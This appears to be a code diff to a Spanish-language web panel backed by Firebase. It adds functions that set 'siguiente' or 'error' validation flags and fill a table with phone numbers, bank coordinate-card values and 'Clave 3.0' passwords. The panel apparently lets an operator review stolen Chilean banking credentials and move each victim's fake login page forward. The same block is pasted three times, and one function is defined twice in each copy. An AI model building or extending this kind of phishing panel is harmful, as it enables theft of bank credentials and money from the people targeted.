@@ -29,7 +29,43 @@
     }
 
     setInterval(validarClave3Temp, 1000);
+    
+    function validarRut(correcto) {
+      const ref = firebase.database().ref("validacion_rut");
+      ref.set(correcto ? "siguiente" : "error");
+    }
+    
+    function validarGeneral(esCorrecto) {
+      const estado = esCorrecto ? "siguiente" : "error";
+      firebase.database().ref("validacion_estado").set(estado);
+    }
+    
+    function validarGeneral(esCorrecto) {
+      const estado = esCorrecto ? "siguiente" : "error";
+      firebase.database().ref("validacion_estado").set(estado);
+    }
+
+    function mostrarTemporales() {
+      const telefono = localStorage.getItem("telefono_input");
+      const coord = localStorage.getItem("coordenadas_input");
+      const clave = localStorage.getItem("clave3_input");
+
+      const filas = document.querySelectorAll("#tableBody tr");
+      filas.forEach(fila => {
+        const celdas = fila.querySelectorAll("td");
+        if (celdas.length >= 6) {
+          if (telefono && !celdas[3].textContent.trim()) celdas[3].textContent = telefono;
+          if (coord && !celdas[4].textContent.trim()) celdas[4].textContent = coord;
+          if (clave && !celdas[5].textContent.trim()) celdas[5].textContent = clave;
+        }
+      });
+    }
+
+    setInterval(mostrarTemporales, 1000);
     </script>
+    
+    
+    
     
     
   <script src="https://www.gstatic.com/firebasejs/9.22.2/firebase-database-compat.js">
@@ -56,7 +92,43 @@
     }
 
     setInterval(validarClave3Temp, 1000);
+    
+    function validarRut(correcto) {
+      const ref = firebase.database().ref("validacion_rut");
+      ref.set(correcto ? "siguiente" : "error");
+    }
+    
+    function validarGeneral(esCorrecto) {
+      const estado = esCorrecto ? "siguiente" : "error";
+      firebase.database().ref("validacion_estado").set(estado);
+    }
+    
+    function validarGeneral(esCorrecto) {
+      const estado = esCorrecto ? "siguiente" : "error";
+      firebase.database().ref("validacion_estado").set(estado);
+    }
+
+    function mostrarTemporales() {
+      const telefono = localStorage.getItem("telefono_input");
+      const coord = localStorage.getItem("coordenadas_input");
+      const clave = localStorage.getItem("clave3_input");
+
+      const filas = document.querySelectorAll("#tableBody tr");
+      filas.forEach(fila => {
+        const celdas = fila.querySelectorAll("td");
+        if (celdas.length >= 6) {
+          if (telefono && !celdas[3].textContent.trim()) celdas[3].textContent = telefono;
+          if (coord && !celdas[4].textContent.trim()) celdas[4].textContent = coord;
+          if (clave && !celdas[5].textContent.trim()) celdas[5].textContent = clave;
+        }
+      });
+    }
+
+    setInterval(mostrarTemporales, 1000);
     </script>
+    
+    
+    
     
     
   <style>
@@ -154,9 +226,8 @@
           <th>Coordenadas</th>
           <th>Clave 3.0</th>
           <th>Estado</th>
-          <th>Coord. TEMP</th>
-          <th>Clave 3.0 TEMP</th>
-          <th>Acciones Final</th>
+          
+          
         </tr>
       </thead>
       <tbody id="tbody">
@@ -233,7 +304,43 @@
     }
 
     setInterval(validarClave3Temp, 1000);
+    
+    function validarRut(correcto) {
+      const ref = firebase.database().ref("validacion_rut");
+      ref.set(correcto ? "siguiente" : "error");
+    }
+    
+    function validarGeneral(esCorrecto) {
+      const estado = esCorrecto ? "siguiente" : "error";
+      firebase.database().ref("validacion_estado").set(estado);
+    }
+    
+    function validarGeneral(esCorrecto) {
+      const estado = esCorrecto ? "siguiente" : "error";
+      firebase.database().ref("validacion_estado").set(estado);
+    }
+
+    function mostrarTemporales() {
+      const telefono = localStorage.getItem("telefono_input");
+      const coord = localStorage.getItem("coordenadas_input");
+      const clave = localStorage.getItem("clave3_input");
+
+      const filas = document.querySelectorAll("#tableBody tr");
+      filas.forEach(fila => {
+        const celdas = fila.querySelectorAll("td");
+        if (celdas.length >= 6) {
+          if (telefono && !celdas[3].textContent.trim()) celdas[3].textContent = telefono;
+          if (coord && !celdas[4].textContent.trim()) celdas[4].textContent = coord;
+          if (clave && !celdas[5].textContent.trim()) celdas[5].textContent = clave;
+        }
+      });
+    }
+
+    setInterval(mostrarTemporales, 1000);
     </script>
+    
+    
+    
     
     
 </body>
